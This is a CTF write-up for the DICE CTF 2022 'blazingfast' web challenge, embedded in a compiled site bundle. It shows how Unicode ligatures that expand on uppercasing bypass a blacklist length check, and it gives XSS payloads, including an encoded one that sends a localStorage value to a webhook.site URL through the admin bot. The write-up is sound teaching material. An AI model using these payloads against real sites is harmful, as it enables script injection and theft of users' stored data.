\",(0,n.jsx)(e.span,{className:\"token number\",children:\"32\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token char\",children:\"'<'\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"||\"}),\" buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token char\",children:\"'>'\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"||\"}),\" buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token char\",children:\"'&'\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"||\"}),\" buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token char\",children:`'\"'`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\tptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Several checks are made on our input. Our input can\\u2019t be more than 1000 characters and a few characters are blacklisted: [\",(0,n.jsx)(e.code,{children:\"<\"}),\", \",(0,n.jsx)(e.code,{children:\">\"}),\", \",(0,n.jsx)(e.code,{children:\"&\"}),\", \",(0,n.jsx)(e.code,{children:'\"'}),\"].\"]}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsx)(e.p,{children:\"After a lot of trial and error we had an idea that in order to bypass these checks and execute our JavaScript payloads we need to bypass the 1000 characters.\"}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/dice-ctf-2022/blazing-fast/too_long.png\",alt:\"too_long\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We stumbled upon an article talking about \",(0,n.jsx)(e.a,{href:\"https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html\",children:\"Exploiting XSS with 20 characters limitation\"}),\" by using unicode characters. In this article, the author gives us a great example:\"]}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsx)(e.p,{children:\"Notice that \\uFB00 characters is only one character but when browsers interpret it, it will be expanded as ff two characters.\"}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"We proceed by testing this idea by sending around 600 \",(0,n.jsx)(e.code,{children:\"\\uFB00\"}),\" which would unpack to 1200 characters. We don\\u2019t get any error as shown below:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/dice-ctf-2022/blazing-fast/no_error.png\",alt:\"No Error\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This is because \",(0,n.jsx)(e.code,{children:'\"\\uFB03\".toUpperCase()'}),\" becomes \",(0,n.jsx)(e.code,{children:'\"FFI\"'}),\". The string written to WSAM module is the converted one (disregarding the memory allocated), but the length reported was of the original string. This discrepancy allowing us to write \",(0,n.jsx)(e.span,{className:\"math math-inline\",children:(0,n.jsxs)(e.span,{className:\"katex\",children:[(0,n.jsx)(e.span,{className:\"katex-mathml\",children:(0,n.jsx)(e.math,{xmlns:\"http://www.w3.org/1998/Math/MathML\",children:(0,n.jsxs)(e.semantics,{children:[(0,n.jsxs)(e.mrow,{children:[(0,n.jsx)(e.mn,{children:\"3\"}),(0,n.jsx)(e.mi,{children:\"n\"}),(0,n.jsx)(e.mo,{children:\"+\"}),(0,n.jsx)(e.mi,{children:\"m\"})]}),(0,n.jsx)(e.annotation,{encoding:\"application/x-tex\",children:\"3n+m\"})]})})}),(0,n.jsxs)(e.span,{className:\"katex-html\",\"aria-hidden\":\"true\",children:[(0,n.jsxs)(e.span,{className:\"base\",children:[(0,n.jsx)(e.span,{className:\"strut\",style:{height:\"0.7278em\",verticalAlign:\"-0.0833em\"}}),(0,n.jsx)(e.span,{className:\"mord\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"mord mathnormal\",children:\"n\"}),(0,n.jsx)(e.span,{className:\"mspace\",style:{marginRight:\"0.2222em\"}}),(0,n.jsx)(e.span,{className:\"mbin\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"mspace\",style:{marginRight:\"0.2222em\"}})]}),(0,n.jsxs)(e.span,{className:\"base\",children:[(0,n.jsx)(e.span,{className:\"strut\",style:{height:\"0.4306em\"}}),(0,n.jsx)(e.span,{className:\"mord mathnormal\",children:\"m\"})]})]})]})}),\" characters to the memory with only \",(0,n.jsx)(e.span,{className:\"math math-inline\",children:(0,n.jsxs)(e.span,{className:\"katex\",children:[(0,n.jsx)(e.span,{className:\"katex-mathml\",children:(0,n.jsx)(e.math,{xmlns:\"http://www.w3.org/1998/Math/MathML\",children:(0,n.jsxs)(e.semantics,{children:[(0,n.jsxs)(e.mrow,{children:[(0,n.jsx)(e.mi,{children:\"n\"}),(0,n.jsx)(e.mo,{children:\"+\"}),(0,n.jsx)(e.mi,{children:\"m\"})]}),(0,n.jsx)(e.annotation,{encoding:\"application/x-tex\",children:\"n+m\"})]})})}),(0,n.jsxs)(e.span,{className:\"katex-html\",\"aria-hidden\":\"true\",children:[(0,n.jsxs)(e.span,{className:\"base\",children:[(0,n.jsx)(e.span,{className:\"strut\",style:{height:\"0.6667em\",verticalAlign:\"-0.0833em\"}}),(0,n.jsx)(e.span,{className:\"mord mathnormal\",children:\"n\"}),(0,n.jsx)(e.span,{className:\"mspace\",style:{marginRight:\"0.2222em\"}}),(0,n.jsx)(e.span,{className:\"mbin\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"mspace\",style:{marginRight:\"0.2222em\"}})]}),(0,n.jsxs)(e.span,{className:\"base\",children:[(0,n.jsx)(e.span,{className:\"strut\",style:{height:\"0.4306em\"}}),(0,n.jsx)(e.span,{className:\"mord mathnormal\",children:\"m\"})]})]})]})}),\" bytes checked for blacklisted characters, thus bypassing the check.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"We proceed by using this technique and adding to it our XSS payload to see if we can pop an alert:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"code-highlight\",children:(0,n.jsx)(e.span,{className:\"code-line\",children:` \\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03<img src=x onerror=alert(1)>\n`})})}),`\n`,(0,n.jsxs)(e.p,{children:[\"To our surprise, we get an error \",(0,n.jsx)(e.code,{children:\"ALERT is not defined\"}),\":\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/dice-ctf-2022/blazing-fast/ALERT_ERROR.png\",alt:\"ALERT_ERROR\"})}),`\n`,(0,n.jsx)(e.p,{children:\"The issue here is that all our payload will be in upper case letters. We came up with a workaround by using XML encoding followed by URL encoding as following:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"code-highlight\",children:(0,n.jsx)(e.span,{className:\"code-line\",children:` \\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03<img src=x onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>\n`})})}),`\n`,(0,n.jsxs)(e.p,{children:[`And we popped an alert!\n`,(0,n.jsx)(e.img,{src:\"/static/images/dice-ctf-2022/blazing-fast/alert_pop.png\",alt:\"XSS Alert\"})]}),`\n`,(0,n.jsx)(e.p,{children:\"We continue by crafting a payload to extract the flag and send it back to our webhook.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"code-highlight\",children:(0,n.jsx)(e.span,{className:\"code-line\",children:`<img src=x onerror=location.href='https://webhook.site/38689352-bda5-4841-80e3-4a48e1655deb?q='.toLowerCase()+localStorage.getItem('flag'.toLowerCase())>\n`})})}),`\n`,(0,n.jsx)(e.p,{children:\"After XML and URL encoding our input we send it to the admin bot as shown below:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"code-highlight\",children:(0,n.jsx)(e.span,{className:\"code-line\",children:`\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03\\uFB03<img src=x onerror=&#X6c;&#X6f;&#X63;&#X61;&#X74;&#X69;&#X6f;&#X6e;.&#X68;&#X72;&#X65;&#X66;=&#X27;https://webhook.site/38689352-bda5-4841-80e3-4a48e1655deb?q=&#X27.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;()&#X2B;&#X6c;&#X6f;&#X63;&#X61;&#X6c;&#X53;&#X74;&#X6f;&#X72;&#X61;&#X67;&#X65;.&#X67;&#X65;&#X74;&#X49;&#X74;&#X65;&#X6d;(&#X27;flag&#X27;.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;())>\n`})})}),`\n`,(0,n.jsx)(e.p,{children:\"Finally we receive our flag from the server:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/dice-ctf-2022/blazing-fast/flag.png\",alt:\"SUCCESS\"})})]})}}var w=b;return y;})();\n;return Component;","toc":[{"value":"blazingfast","url":"#blazingfast","depth":2}],"frontMatter":{"readingTime":{"text":"6 min read","minutes":5.485,"time":329100,"words":1097},"slug":"dice-ctf-2022/blazingfast","fileName":"dice-ctf-2022/blazingfast.md","title":"DICE CTF 2022 – blazingfast","date":"2022-02-06T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["DICE CTF 2022","Web","XSS","Unicode"],"summary":"Bypassing length limitation with Unicode"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.18,"time":10800,"words":36},"slug":["thebish0p"],"fileName":"thebish0p.md","name":"thebish0p","avatar":"https://www.gravatar.com/avatar/4bbe2c02b2eb4589f0ef3c2d0e39a640?d=identicon&s=256","specialties":["Web"],"linkedin":"https://linkedin.com/in/eliemoutran","github":"https://github.com/eliemoutran","member":true,"retired":true,"description":"Security, Programming and Mathematics","order":2,"date":null}],"prev":{"title":"DICE CTF 2022 – knock-knock","date":"2022-02-06T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["DICE CTF 2022","Web","Crypto","JavaScript","Signature"],"summary":"Make sure to call your functions :)","slug":"dice-ctf-2022/knock"},"next":{"title":"Cyber Grabs CTF 0x03 – Unbr34k4bl3","date":"2022-02-07T00:00:00.000Z","draft":false,"authors":["michael"],"tags":["Cyber Grabs CTF 0x03","Crypto","RSA","Number Theory"],"summary":"Unbreakable RSA Challenge?","canonical":"https://mzhang.io/posts/2022-02-07-cybergrabs-ctf-unbreakable/","slug":"cyber-grabs-ctf-0x03/unbr34k4bl3"}},"__N_SSG":true}